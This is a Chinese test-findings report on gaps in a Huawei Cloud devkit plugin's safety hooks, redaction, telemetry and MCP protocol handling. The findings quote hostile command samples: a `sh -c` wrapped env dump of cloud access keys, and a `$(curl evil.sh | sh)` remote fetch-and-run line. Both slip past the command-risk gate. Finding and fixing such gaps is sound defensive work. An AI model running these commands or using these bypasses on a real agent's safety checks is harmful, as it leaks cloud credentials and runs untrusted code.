# FINDINGS — 缺陷发现清单（DSH-deepseek-v4-pro-0813）

> **落盘路径**：`results/DSH/2026-10-25-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-10-25 05:20（北京时间）
> **被测版本**：huaweicloud-devkit v1.1.12（gitHead 4ed07801）

## #1【P0】D4-16 sh -c 命令包裹穿透（凭证 env 打印绕过）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `decision=allow, findings=[]`，凭证读取命令经 shell 包裹后被放行
- **断言**：包裹在 `sh -c "..."` / `bash -c "..."` 内的 `env`/`printenv` 打印凭证命令应同样返回 `deny`
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-command-env-dump` 规则正则 `(^|\s)(env|printenv|...)` 仅匹配行首/空白后的 `env`，无法命中引号内的 `sh -c "env ..."`；配合 `risk-rule-engine.mjs:106` 无命中即 `allow` 的兜底
- **影响**：凭证环境变量（HW_ACCESS_KEY/HW_SECRET_KEY）可经 shell 包裹绕过安全 hook 被读取
- **证据**：`evidence/D4-16/stdout.log`

## #2【P1】D4-17 命令替换 $(...) 未 fail-closed

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `decision=allow`，畸形/模糊输入未按 fail-closed 拒绝
- **断言**：命令替换 `$(...)` / 反引号执行的模糊输入应返回 `deny` 或至少 `warn`，不得 `allow`
- **根因**：`safety/rules/cloud-risk-rules.json` 无「命令替换 / 反引号 / 远程管道执行」规则；`risk-rule-engine.mjs:106` `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'` 对未知形态默认放行（fail-open）
- **影响**：恶意命令替换可绕过风险门禁，存在命令注入放大风险
- **证据**：`evidence/D4-17/stdout.log`

## #3【P1】D4-3 kms DecryptData 明文 secret API 未拦截

- **现象**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` 返回 `decision=allow`，KMS 解密明文 secret 未阻断
- **断言**：`hcloud kms DecryptData` 类明文 secret 读取 API 应返回 `deny`
- **根因**：`safety/rules/cloud-risk-rules.json` `hwc-command-secret-value-read` 规则正则仅覆盖 `ShowSecretVersion|ShowSecret|DownloadSecret...`，漏 `DecryptData`（KMS 明文解密）
- **影响**：KMS 解密明文可经 CLI 直接读取，明文 secret API 拦截缺口
- **证据**：`evidence/D4-3/stdout.log`

## #4【P1】D2-4 凭证脱敏漏小写 ak=/sk=

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文 `ak=AK123456 sk=SKsecret`（小写形态未脱敏），而大写 `AK=/SK=` 正常脱敏
- **断言**：小写 `ak=`/`sk=` 形式也应被脱敏为 `ak=<redacted> sk=<redacted>`
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` 第三段 `.replace(/(AK|SK)\s*[:=]\s*.../g, ...)` 缺少 `i` 忽略大小写标志（前两段均带 `gi`）
- **影响**：小写 `ak=/sk=` 凭证明文残留
- **证据**：`evidence/D2-4/stdout.log`

## #5【P1】D8-9 telemetry sanitizeValue 未脱敏凭证

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 返回原文，凭证未脱敏即入遥测事件
- **断言**：通过 `sanitizeValue` / `buildEvent` 进入遥测的 value 中的 AK/secret_key/token 应被脱敏
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-197` `sanitizeValue()` 仅做换行/制表符替换与长度截断，未调用 `redactSecrets`
- **影响**：凭证可能经遥测上报明文外泄
- **证据**：`evidence/D8-9/stdout.log`

## #6【P1】D4-21 HCL/Terraform broad IAM 制品未拦截

- **现象**：`evaluateArtifacts` 对 JSON IAM（`"Action":"*","Resource":"*"`）返回 `deny`，对 HCL（`resource "huaweicloud_iam_policy" "p" { actions = ["*"] }`）返回 `allow`
- **断言**：HCL/Terraform 形态的 broad IAM（`actions = ["*"]`）制品也应返回 `deny`
- **根因**：`safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 规则正则面向 JSON IAM 语法（Action/Effect/Statement），未覆盖 HCL `resource "huaweicloud_iam_policy" ... actions = ["*"]` 语法
- **影响**：IaC（Terraform/HCL）宽泛 IAM 策略可绕过制品预检
- **证据**：`evidence/D4-21/stdout.log`

## #7【P1】D9-12 MCP 协议非法时序未拒绝

- **现象**：未 `initialize` 直接调 `tools/list` 返回全量 40+ 工具，而非拒绝（非法时序）
- **断言**：`tools/list`（或 `tools/call`）应在 `initialize` 完成后才可用，未初始化时应返回 -32002/-32600 类错误
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57-58` `if (method === 'tools/list') return { tools: TOOL_DEFINITIONS }` 无 `_initialized` 前置校验
- **影响**：MCP 协议生命周期不完整，非法时序客户端仍可枚举工具
- **证据**：`evidence/D9-12/stdout.log`

## #8【P1】EXP-E01 服务目录路由 MISS（「云主机」意图未命中 ECS）

- **现象**：意图「帮我查一下我账号在华北北京四有哪些云主机」路由到 `Run hcloud --help to list available services.`（未命中 ECS）
- **断言**：该意图应命中 ECS（expected [ECS]）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2188-2443` `serviceCatalog()` 关键词表 ECS 条目缺少「云主机」关键词，未命中时回退到 `tools.mjs:2443` 的 `Run hcloud --help...`
- **影响**：服务目录路由准确率下降（今日 D10-3 路由层命中率 92.9%，1 处 MISS 即此）
- **证据**：`evidence/EXP-E01/stdout.log`

## #9【P2】D3-S7 复合意图路由丢部署目标

- **现象**：意图「部署一个 Web 应用并连接 RDS 数据库」仅命中 RDS，未命中部署目标（Sandbox/CloudDeploy/ECS/CCE）
- **断言**：复合意图应同时命中 RDS + 部署目标（多服务）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2188` `serviceCatalog()` 复合意图匹配未把「部署 Web 应用」关键词并集到部署类服务组
- **影响**：复合意图分层路由漏服务，影响跨服务方案生成
- **证据**：`evidence/D3-S7/stdout.log`

## #10【P2】D1-68 region 读取优先级契约漂移（SPEC-MISMATCH）

- **现象**：`credentials.mjs` 区域解析 `HW_REGION` 优先于 `HUAWEICLOUD_REGION`（idxHW=7091 < idxHR=7123），与用例契约相反
- **断言**：契约期望 `HUAWEICLOUD_REGION` 优先于 `HW_REGION`
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225` `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`
- **影响**：多环境变量同设时区域取值与契约不符，可能导致跨区域误操作
- **证据**：`evidence/D1-68/stdout.log`

## #11【P2】D2-10 KooCLI 缺失配置报错文案不符合契约

- **现象**：KooCLI 缺失 config 返回 `KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)`，而契约断言精确串为 `KooCLI config not found`
- **断言**：缺失 config 的报错应精确返回 `KooCLI config not found`
- **根因**：`plugins/huaweicloud-core/src/auth/reconcile.mjs:50` `errorFromTable('HDKIT_KOOCLI_NOT_READY', 'KooCLI config not found')` 渲染时拼接了 `auth/guidance.mjs:71` 的中文指引 `messageZh: 'KooCLI(hcloud)未安装或未就绪。'`
- **影响**：报错文案混入中文指引，破坏「精确串」契约，影响依赖精确匹配的客户端
- **证据**：`evidence/D2-10/stdout.log`

## #12【P2】D3-C14 沙箱无凭证报错文案不符合契约

- **现象**：无限凭证时 `hdkitCheckUser` 抛出 `未配置华为云凭证,需要先完成登录。`，契约断言为 `credentials not configured`
- **断言**：无凭证时的错误信息应精确为 `credentials not configured`
- **根因**：`plugins/huaweicloud-core/src/auth/service.mjs:134` / `auth/guidance.mjs:55` 返回中文指引 `未配置华为云凭证,需要完成登录后才能使用云能力。`，未按英文契约码返回
- **影响**：沙箱 HDKit 无凭证错误的本地化文案与契约不一致
- **证据**：`evidence/D3-C14/stdout.log`
